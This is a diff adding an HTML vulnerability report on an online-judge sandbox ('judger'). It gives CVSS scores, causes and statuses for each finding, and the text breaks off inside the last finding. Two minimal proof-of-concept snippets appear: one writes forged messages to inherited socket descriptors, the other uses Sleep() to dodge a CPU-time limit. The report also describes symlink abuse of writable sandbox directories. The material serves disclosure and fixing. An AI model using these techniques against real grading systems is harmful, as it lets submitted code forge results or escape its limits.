@@ -1,0 +1,592 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="color-scheme" content="light dark">
+    <title>Vuln report external english</title>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@5.5.0/github-markdown.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github.min.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.css">
+    <style>
+        /* ========== 全局主题变量 ========== */
+        :root {
+            color-scheme: light dark;
+            --bg-body: #f6f8fa;
+            --bg-card: #ffffff;
+            --text-primary: #24292f;
+            --text-secondary: #57606a;
+            --border-light: #e1e4e8;
+            --code-bg: #f6f8fa;
+            --code-header-bg: #f1f3f5;
+            --code-header-border: #e1e4e8;
+            --btn-bg: #ffffff;
+            --btn-border: #d0d7de;
+            --btn-hover-bg: #eaeef2;
+            --shadow: 0 1px 4px rgba(0,0,0,0.1);
+            --code-text: #24292f;
+            --line-numbers-color: #8c959f;
+            
+            
+        }
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --bg-body: #0d1117;
+                --bg-card: #161b22;
+                --text-primary: #c9d1d9;
+                --text-secondary: #8b949e;
+                --border-light: #30363d;
+                --code-bg: #0d1117;
+                --code-header-bg: #21262d;
+                --code-header-border: #30363d;
+                --btn-bg: #21262d;
+                --btn-border: #30363d;
+                --btn-hover-bg: #30363d;
+                --shadow: 0 1px 4px rgba(0,0,0,0.3);
+                --code-text: #c9d1d9;
+                --line-numbers-color: #8b949e;
+                
+                
+            }
+        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            padding: 2rem;
+            background-color: var(--bg-body);
+            color: var(--text-primary);
+        }
+        
+        
+        .markdown-body {
+            max-width: 1200px;
+            margin: 0 auto;
+            background-color: var(--bg-card);
+            border-radius: 8px;
+            padding: 2rem;
+            box-shadow: var(--shadow);
+        }
+        .markdown-body {
+            color: var(--text-primary) !important;
+        }
+        .code-content pre code,
+        .code-content pre code.hljs {
+            color: var(--code-text) !important;
+            background-color: var(--code-bg) !important;
+        }
+        .line-numbers {
+            color: var(--line-numbers-color) !important;
+            background-color: var(--code-bg) !important;
+        }
+        .code-wrapper {
+            margin: 1rem 0;
+            border-radius: 6px;
+            overflow: hidden;
+            border: 1px solid var(--border-light);
+        }
+        .code-header {
+            display: flex;
+            justify-content: space-between;
+            background-color: var(--code-header-bg);
+            padding: 0.4rem 1rem;
+            font-size: 0.85rem;
+            border-bottom: 1px solid var(--code-header-border);
+        }
+        .code-lang {
+            font-weight: 600;
+            color: var(--text-primary);
+        }
+        .copy-btn {
+            background-color: var(--btn-bg);
+            border: 1px solid var(--btn-border);
+            border-radius: 6px;
+            padding: 0.2rem 0.6rem;
+            cursor: pointer;
+            color: var(--text-primary);
+        }
+        .copy-btn:hover { background-color: var(--btn-hover-bg); }
+        .copy-btn.copied {
+            background: #2cbe4e;
+            border-color: #2cbe4e;
+            color: white;
+        }
+        .code-content pre {
+            margin: 0 !important;
+            border-radius: 0 !important;
+            background-color: var(--code-bg) !important;
+            overflow-x: auto;
+            padding: 10px;
+            padding-top: 5px;
+            padding-bottom: 5px;
+        }
+        .code-content pre code {
+            padding: 0 !important;
+            tab-size: 4;
+            -moz-tab-size: 4;
+        }
+        .footer {
+            max-width: 1200px;
+            margin: 2rem auto 0;
+            text-align: center;
+            font-size: 0.85rem;
+            color: var(--text-secondary);
+            border-top: 1px solid var(--border-light);
+            padding: 1.5rem 0;
+        }
+        .footer a {
+            color: #0969da;
+            text-decoration: none;
+        }
+        .katex-display { overflow-x: auto; }
+        .katex-error {
+            color: #dc2626;
+            background: #fef2f2;
+            padding: 0.2rem 0.4rem;
+            border-radius: 4px;
+        }
+        @media (max-width: 768px) {
+            .markdown-body { padding: 1rem; }
+            
+        }
+    </style>
+    <script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.js"></script>
+    <script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/contrib/auto-render.min.js" onload="renderMathInElement(document.body, {
+        delimiters: [{left: '$$', right: '$$', display: true}, {left: '$', right: '$', display: false}],
+        ignoredTags: ['pre', 'code', 'script', 'style', 'textarea'],
+        ignoredClasses: ['code-wrapper', 'line-numbers', 'copy-btn']
+    });"></script>
+</head>
+<body>
+<div class="">
+    <div class="main-content">
+        
+        <div class="markdown-body"><h2 id="symbol-convention">Symbol convention</h2>
+<p>PLV：Process Limitation Violation<br>PAV：Process Access Violation<br>DoS：Denial of service</p>
+<p>Specific types were marked with CWE.</p>
+<p>CVSS scores are based on CVSS v4.0 Base Metrics (with optional Threat Metrics considered for range).</p>
+<h2 id="found-vulnerability">Found vulnerability</h2>
+<h3 id="pav1dos1">PAV1/DoS1</h3>
+<p><strong>Type</strong>:<br>CWE-250 (Execution with Unnecessary Privileges)<br>CWE-403 (Exposure of File Descriptor to Unintended Control Sphere)  </p>
+<div class="code-wrapper">
+<div class="code-header">
+    <span class="code-lang">JSON</span>
+    <button class="copy-btn" data-code="{
+	&quot;base_score&quot;: 8.8,
+	&quot;score_range&quot;: &quot;8.6-9.3&quot;,
+	&quot;vector&quot;: &quot;CVSS:4.0/AV:L/AC:L/AT:N/PR:L/UI:N/VC:L/VI:H/VA:H/SC:L/SI:H/SA:H&quot;,
+	&quot;metrics&quot;: {
+		&quot;Attack Vector&quot;: &quot;Local&quot;,
+		&quot;Attack Complexity&quot;: &quot;Low&quot;,
+		&quot;Attack Requirements&quot;: &quot;None&quot;,
+		&quot;Privileges Required&quot;: &quot;Low&quot;,
+		&quot;User Interaction&quot;: &quot;None&quot;,
+		&quot;Vulnerable System Confidentiality&quot;: &quot;Low&quot;,
+		&quot;Vulnerable System Integrity&quot;: &quot;High&quot;,
+		&quot;Vulnerable System Availability&quot;: &quot;High&quot;,
+		&quot;Subsequent System Confidentiality&quot;: &quot;Low&quot;,
+		&quot;Subsequent System Integrity&quot;: &quot;High&quot;,
+		&quot;Subsequent System Availability&quot;: &quot;High&quot;
+	}
+}
+">复制</button>
+</div>
+<div class="code-content">
+    <pre><code class="hljs language-json"><span class="hljs-punctuation">{</span>
+	<span class="hljs-attr">&quot;base_score&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">8.8</span><span class="hljs-punctuation">,</span>
+	<span class="hljs-attr">&quot;score_range&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;8.6-9.3&quot;</span><span class="hljs-punctuation">,</span>
+	<span class="hljs-attr">&quot;vector&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;CVSS:4.0/AV:L/AC:L/AT:N/PR:L/UI:N/VC:L/VI:H/VA:H/SC:L/SI:H/SA:H&quot;</span><span class="hljs-punctuation">,</span>
+	<span class="hljs-attr">&quot;metrics&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
+		<span class="hljs-attr">&quot;Attack Vector&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Local&quot;</span><span class="hljs-punctuation">,</span>
+		<span class="hljs-attr">&quot;Attack Complexity&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Low&quot;</span><span class="hljs-punctuation">,</span>
+		<span class="hljs-attr">&quot;Attack Requirements&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;None&quot;</span><span class="hljs-punctuation">,</span>
+		<span class="hljs-attr">&quot;Privileges Required&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Low&quot;</span><span class="hljs-punctuation">,</span>
+		<span class="hljs-attr">&quot;User Interaction&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;None&quot;</span><span class="hljs-punctuation">,</span>
+		<span class="hljs-attr">&quot;Vulnerable System Confidentiality&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Low&quot;</span><span class="hljs-punctuation">,</span>
+		<span class="hljs-attr">&quot;Vulnerable System Integrity&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;High&quot;</span><span class="hljs-punctuation">,</span>
+		<span class="hljs-attr">&quot;Vulnerable System Availability&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;High&quot;</span><span class="hljs-punctuation">,</span>
+		<span class="hljs-attr">&quot;Subsequent System Confidentiality&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Low&quot;</span><span class="hljs-punctuation">,</span>
+		<span class="hljs-attr">&quot;Subsequent System Integrity&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;High&quot;</span><span class="hljs-punctuation">,</span>
+		<span class="hljs-attr">&quot;Subsequent System Availability&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;High&quot;</span>
+	<span class="hljs-punctuation">}</span>
+<span class="hljs-punctuation">}</span>
+</code></pre>
+</div>
+</div>
+<p><strong>Affected</strong>:<br>Linux judger<br>during 1.0.0.0 internal check</p>
+<p><strong>Description</strong>:<br>Child process contacts directly with database service through TCP socket fd inherited from parent, causing fake results in database, interrupted network protocol, and leads to a SIGSEGV exit of judger.</p>
+<p><strong>Reason</strong>:  </p>
+<ol>
+<li>fork() and execl() inherits fd of father process, including socket fd used to contact with database</li>
+<li>Reasons realted to communication protocol ommited, which can cause the whole judger exit abnormally</li>
+</ol>
+<p><strong>PoC</strong>:  </p>
+<div class="code-wrapper">
+<div class="code-header">
+    <span class="code-lang">CPP</span>
+    <button class="copy-btn" data-code="#include &lt;unistd.h&gt;
+#include &lt;string&gt;
+std::string build_forged_message();
+int main() {
+	std::string msg = build_forged_message();
+	for (int fd = 3; fd &lt; 256; ++fd)
+		write(fd, msg.data(), msg.size());
+	return 0;
+}
+">复制</button>
+</div>
+<div class="code-content">
+    <pre><code class="hljs language-cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span></span>
+<span class="hljs-function">std::string <span class="hljs-title">build_forged_message</span><span class="hljs-params">()</span></span>;
+<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{
+	std::string msg = <span class="hljs-built_in">build_forged_message</span>();
+	<span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> fd = <span class="hljs-number">3</span>; fd &lt; <span class="hljs-number">256</span>; ++fd)
+		<span class="hljs-built_in">write</span>(fd, msg.<span class="hljs-built_in">data</span>(), msg.<span class="hljs-built_in">size</span>());
+	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+}
+</code></pre>
+</div>
+</div>
+<p><strong>Status</strong>:<br>Open</p>
+<h3 id="plv1">PLV1</h3>
+<p><strong>Type</strong>:<br>CWE-770 (Allocation of Resources Without Limits or Throttling)  </p>
+<div class="code-wrapper">
+<div class="code-header">
+    <span class="code-lang">JSON</span>
+    <button class="copy-btn" data-code="{
+	&quot;base_score&quot;: 3.5,
+	&quot;score_range&quot;: &quot;2.5-4.5&quot;,
+	&quot;vector&quot;: &quot;CVSS:4.0/AV:L/AC:L/AT:N/PR:L/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N&quot;,
+	&quot;metrics&quot;: {
+		&quot;Attack Vector&quot;: &quot;Local&quot;,
+		&quot;Attack Complexity&quot;: &quot;Low&quot;,
+		&quot;Attack Requirements&quot;: &quot;None&quot;,
+		&quot;Privileges Required&quot;: &quot;Low&quot;,
+		&quot;User Interaction&quot;: &quot;None&quot;,
+		&quot;Vulnerable System Confidentiality&quot;: &quot;None&quot;,
+		&quot;Vulnerable System Integrity&quot;: &quot;None&quot;,
+		&quot;Vulnerable System Availability&quot;: &quot;Low&quot;,
+		&quot;Subsequent System Confidentiality&quot;: &quot;None&quot;,
+		&quot;Subsequent System Integrity&quot;: &quot;None&quot;,
+		&quot;Subsequent System Availability&quot;: &quot;None&quot;
+	}
+}
+">复制</button>
+</div>
+<div class="code-content">
+    <pre><code class="hljs language-json"><span class="hljs-punctuation">{</span>
+	<span class="hljs-attr">&quot;base_score&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">3.5</span><span class="hljs-punctuation">,</span>
+	<span class="hljs-attr">&quot;score_range&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;2.5-4.5&quot;</span><span class="hljs-punctuation">,</span>
+	<span class="hljs-attr">&quot;vector&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;CVSS:4.0/AV:L/AC:L/AT:N/PR:L/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N&quot;</span><span class="hljs-punctuation">,</span>
+	<span class="hljs-attr">&quot;metrics&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
+		<span class="hljs-attr">&quot;Attack Vector&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Local&quot;</span><span class="hljs-punctuation">,</span>
+		<span class="hljs-attr">&quot;Attack Complexity&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Low&quot;</span><span class="hljs-punctuation">,</span>
+		<span class="hljs-attr">&quot;Attack Requirements&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;None&quot;</span><span class="hljs-punctuation">,</span>
+		<span class="hljs-attr">&quot;Privileges Required&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Low&quot;</span><span class="hljs-punctuation">,</span>
+		<span class="hljs-attr">&quot;User Interaction&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;None&quot;</span><span class="hljs-punctuation">,</span>
+		<span class="hljs-attr">&quot;Vulnerable System Confidentiality&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;None&quot;</span><span class="hljs-punctuation">,</span>
+		<span class="hljs-attr">&quot;Vulnerable System Integrity&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;None&quot;</span><span class="hljs-punctuation">,</span>
+		<span class="hljs-attr">&quot;Vulnerable System Availability&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Low&quot;</span><span class="hljs-punctuation">,</span>
+		<span class="hljs-attr">&quot;Subsequent System Confidentiality&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;None&quot;</span><span class="hljs-punctuation">,</span>
+		<span class="hljs-attr">&quot;Subsequent System Integrity&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;None&quot;</span><span class="hljs-punctuation">,</span>
+		<span class="hljs-attr">&quot;Subsequent System Availability&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;None&quot;</span>
+	<span class="hljs-punctuation">}</span>
+<span class="hljs-punctuation">}</span>
+</code></pre>
+</div>
+</div>
+<p><strong>Affected</strong>:<br>Windows judger<br>during 1.0.0.0 internal check</p>
+<p><strong>Description</strong>:<br>Process can exceed the maximum CPU time limit by using <code>Sleep()</code>, which consumes negligible CPU time and bypasses the CPU‑time‑based limit.</p>
+<p><strong>Reason</strong>:  </p>
+<ol>
+<li>The judger monitors CPU time (kernel+user) via <code>GetProcessTimes</code>, but <code>Sleep()</code> does not consume CPU time, allowing the process to stay alive longer without hitting the limit.</li>
+</ol>
+<p><strong>PoC</strong>:  </p>
+<div class="code-wrapper">
+<div class="code-header">
+    <span class="code-lang">CPP</span>
+    <button class="copy-btn" data-code="#include &lt;Windows.h&gt;
+int main() { Sleep(100000); return 0; }
+">复制</button>
+</div>
+<div class="code-content">
+    <pre><code class="hljs language-cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span>
+<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{ <span class="hljs-built_in">Sleep</span>(<span class="hljs-number">100000</span>); <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; }
+</code></pre>
+</div>
+</div>
+<p><strong>Status</strong>:<br>Fixed</p>
+<h3 id="plv2">PLV2</h3>
+<p><strong>Type</strong>:<br>CWE-755 (Improper Handling of Exceptional Conditions)  </p>
+<div class="code-wrapper">
+<div class="code-header">
+    <span class="code-lang">JSON</span>
+    <button class="copy-btn" data-code="{
+	&quot;base_score&quot;: 3.5,
+	&quot;score_range&quot;: &quot;2.5-4.5&quot;,
+	&quot;vector&quot;: &quot;CVSS:4.0/AV:L/AC:L/AT:N/PR:L/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N&quot;,
+	&quot;metrics&quot;: {
+		&quot;Attack Vector&quot;: &quot;Local&quot;,
+		&quot;Attack Complexity&quot;: &quot;Low&quot;,
+		&quot;Attack Requirements&quot;: &quot;None&quot;,
+		&quot;Privileges Required&quot;: &quot;Low&quot;,
+		&quot;User Interaction&quot;: &quot;None&quot;,
+		&quot;Vulnerable System Confidentiality&quot;: &quot;None&quot;,
+		&quot;Vulnerable System Integrity&quot;: &quot;None&quot;,
+		&quot;Vulnerable System Availability&quot;: &quot;Low&quot;,
+		&quot;Subsequent System Confidentiality&quot;: &quot;None&quot;,
+		&quot;Subsequent System Integrity&quot;: &quot;None&quot;,
+		&quot;Subsequent System Availability&quot;: &quot;None&quot;
+	}
+}
+">复制</button>
+</div>
+<div class="code-content">
+    <pre><code class="hljs language-json"><span class="hljs-punctuation">{</span>
+	<span class="hljs-attr">&quot;base_score&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">3.5</span><span class="hljs-punctuation">,</span>
+	<span class="hljs-attr">&quot;score_range&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;2.5-4.5&quot;</span><span class="hljs-punctuation">,</span>
+	<span class="hljs-attr">&quot;vector&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;CVSS:4.0/AV:L/AC:L/AT:N/PR:L/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N&quot;</span><span class="hljs-punctuation">,</span>
+	<span class="hljs-attr">&quot;metrics&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
+		<span class="hljs-attr">&quot;Attack Vector&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Local&quot;</span><span class="hljs-punctuation">,</span>
+		<span class="hljs-attr">&quot;Attack Complexity&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Low&quot;</span><span class="hljs-punctuation">,</span>
+		<span class="hljs-attr">&quot;Attack Requirements&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;None&quot;</span><span class="hljs-punctuation">,</span>
+		<span class="hljs-attr">&quot;Privileges Required&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Low&quot;</span><span class="hljs-punctuation">,</span>
+		<span class="hljs-attr">&quot;User Interaction&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;None&quot;</span><span class="hljs-punctuation">,</span>
+		<span class="hljs-attr">&quot;Vulnerable System Confidentiality&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;None&quot;</span><span class="hljs-punctuation">,</span>
+		<span class="hljs-attr">&quot;Vulnerable System Integrity&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;None&quot;</span><span class="hljs-punctuation">,</span>
+		<span class="hljs-attr">&quot;Vulnerable System Availability&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Low&quot;</span><span class="hljs-punctuation">,</span>
+		<span class="hljs-attr">&quot;Subsequent System Confidentiality&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;None&quot;</span><span class="hljs-punctuation">,</span>
+		<span class="hljs-attr">&quot;Subsequent System Integrity&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;None&quot;</span><span class="hljs-punctuation">,</span>
+		<span class="hljs-attr">&quot;Subsequent System Availability&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;None&quot;</span>
+	<span class="hljs-punctuation">}</span>
+<span class="hljs-punctuation">}</span>
+</code></pre>
+</div>
+</div>
+<p><strong>Affected</strong>:<br>Windows judger<br>during 1.0.0.0 internal check</p>
+<p><strong>Description</strong>:<br>Processes exceeding CPU time or memory limits cannot be properly terminated due to abnormal behavior of Job Object, leaving the process running indefinitely.</p>
+<p><strong>Reason</strong>:  </p>
+<ol>
+<li>Job Object limit enforcement occasionally fails, resulting in the process not being killed when limits are exceeded.</li>
+</ol>
+<p><strong>Status</strong>:<br>Fixed</p>
+<h3 id="plv3pav2dos2">PLV3/PAV2/DoS2</h3>
+<p><strong>Type</strong>:<br>CWE-276 (Incorrect Default Permissions)<br>CWE-400 (Uncontrolled Resource Consumption)<br>CWE-61 (Symlink Following)  </p>
+<div class="code-wrapper">
+<div class="code-header">
+    <span class="code-lang">JSON</span>
+    <button class="copy-btn" data-code="{
+	&quot;base_score&quot;: 9.3,
+	&quot;score_range&quot;: &quot;8.3-9.8&quot;,
+	&quot;vector&quot;: &quot;CVSS:4.0/AV:L/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H&quot;,
+	&quot;metrics&quot;: {
+		&quot;Attack Vector&quot;: &quot;Local&quot;,
+		&quot;Attack Complexity&quot;: &quot;Low&quot;,
+		&quot;Attack Requirements&quot;: &quot;None&quot;,
+		&quot;Privileges Required&quot;: &quot;Low&quot;,
+		&quot;User Interaction&quot;: &quot;None&quot;,
+		&quot;Vulnerable System Confidentiality&quot;: &quot;High&quot;,
+		&quot;Vulnerable System Integrity&quot;: &quot;High&quot;,
+		&quot;Vulnerable System Availability&quot;: &quot;High&quot;,
+		&quot;Subsequent System Confidentiality&quot;: &quot;High&quot;,
+		&quot;Subsequent System Integrity&quot;: &quot;High&quot;,
+		&quot;Subsequent System Availability&quot;: &quot;High&quot;
+	}
+}
+">复制</button>
+</div>
+<div class="code-content">
+    <pre><code class="hljs language-json"><span class="hljs-punctuation">{</span>
+	<span class="hljs-attr">&quot;base_score&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">9.3</span><span class="hljs-punctuation">,</span>
+	<span class="hljs-attr">&quot;score_range&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;8.3-9.8&quot;</span><span class="hljs-punctuation">,</span>
+	<span class="hljs-attr">&quot;vector&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;CVSS:4.0/AV:L/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H&quot;</span><span class="hljs-punctuation">,</span>
+	<span class="hljs-attr">&quot;metrics&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
+		<span class="hljs-attr">&quot;Attack Vector&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Local&quot;</span><span class="hljs-punctuation">,</span>
+		<span class="hljs-attr">&quot;Attack Complexity&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Low&quot;</span><span class="hljs-punctuation">,</span>
+		<span class="hljs-attr">&quot;Attack Requirements&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;None&quot;</span><span class="hljs-punctuation">,</span>
+		<span class="hljs-attr">&quot;Privileges Required&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Low&quot;</span><span class="hljs-punctuation">,</span>
+		<span class="hljs-attr">&quot;User Interaction&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;None&quot;</span><span class="hljs-punctuation">,</span>
+		<span class="hljs-attr">&quot;Vulnerable System Confidentiality&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;High&quot;</span><span class="hljs-punctuation">,</span>
+		<span class="hljs-attr">&quot;Vulnerable System Integrity&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;High&quot;</span><span class="hljs-punctuation">,</span>
+		<span class="hljs-attr">&quot;Vulnerable System Availability&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;High&quot;</span><span class="hljs-punctuation">,</span>
+		<span class="hljs-attr">&quot;Subsequent System Confidentiality&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;High&quot;</span><span class="hljs-punctuation">,</span>
+		<span class="hljs-attr">&quot;Subsequent System Integrity&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;High&quot;</span><span class="hljs-punctuation">,</span>
+		<span class="hljs-attr">&quot;Subsequent System Availability&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;High&quot;</span>
+	<span class="hljs-punctuation">}</span>
+<span class="hljs-punctuation">}</span>
+</code></pre>
+</div>
+</div>
+<p><strong>Affected</strong>:<br>Windows judger<br>during 1.0.0.0 internal check</p>
+<p><strong>Description</strong>:<br>AppContainer sandbox grants Read/Write/Execute (RWE) access to <code>%TEMP%</code> and <code>C:\Users\&lt;User&gt;\AppData\Local\Packages\&lt;SID&gt;\</code>. This allows a sandboxed process to:</p>
+<ul>
+<li>Write arbitrary files, potentially filling the disk (DoS).</li>
+<li>Create symbolic links (or hard links) pointing to sensitive system files, enabling unauthorized access or privilege escalation if the judger later operates on those links.</li>
+</ul>
+<p><strong>Reason</strong>:  </p>
+<ol>
+<li>AppContainer default permissions on these directories are overly permissive, violating least‑privilege.  </li>
+<li>No restrictions on file types or link creation, allowing both resource exhaustion and link‑based attacks.</li>
+</ol>
+<p><strong>Status</strong>:<br>Implemented, pending test</p>
+<h3 id="plv4pav3">PLV4/PAV3</h3>
+<p><strong>Type</strong>:<br>CWE-770 (Allocation of Resources Without Limits or Throttling)<br>CWE-400 (Uncontrolled Resource Consumption)  </p>
+<div class="code-wrapper">
+<div class="code-header">
+    <span class="code-lang">JSON</span>
+    <button class="copy-btn" data-code="{
+	&quot;base_score&quot;: 7.5,
+	&quot;score_range&quot;: &quot;6.5-8.5&quot;,
+	&quot;vector&quot;: &quot;CVSS:4.0/AV:L/AC:L/AT:N/PR:L/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N&quot;,
+	&quot;metrics&quot;: {
+		&quot;Attack Vector&quot;: &quot;Local&quot;,
+		&quot;Attack Complexity&quot;: &quot;Low&quot;,
+		&quot;Attack Requirements&quot;: &quot;None&quot;,
+		&quot;Privileges Required&quot;: &quot;Low&quot;,
+		&quot;User Interaction&quot;: &quot;None&quot;,
+		&quot;Vulnerable System Confidentiality&quot;: &quot;None&quot;,
+		&quot;Vulnerable System Integrity&quot;: &quot;None&quot;,
+		&quot;Vulnerable System Availability&quot;: &quot;High&quot;,
+		&quot;Subsequent System Confidentiality&quot;: &quot;None&quot;,
+		&quot;Subsequent System Integrity&quot;: &quot;None&quot;,
+		&quot;Subsequent System Availability&quot;: &quot;None&quot;
+	}
+}
+">复制</button>
+</div>
+<div class="code-content">
+    <pre><code class="hljs language-json"><span class="hljs-punctuation">{</span>
+	<span class="hljs-attr">&quot;base_score&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">7.5</span><span class="hljs-punctuation">,</span>
+	<span class="hljs-attr">&quot;score_range&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;6.5-8.5&quot;</span><span class="hljs-punctuation">,</span>
+	<span class="hljs-attr">&quot;vector&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;CVSS:4.0/AV:L/AC:L/AT:N/PR:L/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N&quot;</span><span class="hljs-punctuation">,</span>
+	<span class="hljs-attr">&quot;metrics&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
+		<span class="hljs-attr">&quot;Attack Vector&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Local&quot;</span><span class="hljs-punctuation">,</span>
+		<span class="hljs-attr">&quot;Attack Complexity&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Low&quot;</span><span class="hljs-punctuation">,</span>
+		<span class="hljs-attr">&quot;Attack Requirements&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;None&quot;</span><span class="hljs-punctuation">,</span>
+		<span class="hljs-attr">&quot;Privileges Required&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Low&quot;</span><span class="hljs-punctuation">,</span>
+		<span class="hljs-attr">&quot;User Interaction&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;None&quot;</span><span class="hljs-punctuation">,</span>
+		<span class="hljs-attr">&quot;Vulnerable System Confidentiality&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;None&quot;</span><span class="hljs-punctuation">,</span>
+		<span class="hljs-attr">&quot;Vulnerable System Integrity&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;None&quot;</span><span class="hljs-punctuation">,</span>
+		<span class="hljs-attr">&quot;Vulnerable System Availability&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;High&quot;</span><span class="hljs-punctuation">,</span>
+		<span class="hljs-attr">&quot;Subsequent System Confidentiality&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;None&quot;</span><span class="hljs-punctuation">,</span>
+		<span class="hljs-attr">&quot;Subsequent System Integrity&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;None&quot;</span><span class="hljs-punctuation">,</span>
+		<span class="hljs-attr">&quot;Subsequent System Availability&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;None&quot;</span>
+	<span class="hljs-punctuation">}</span>
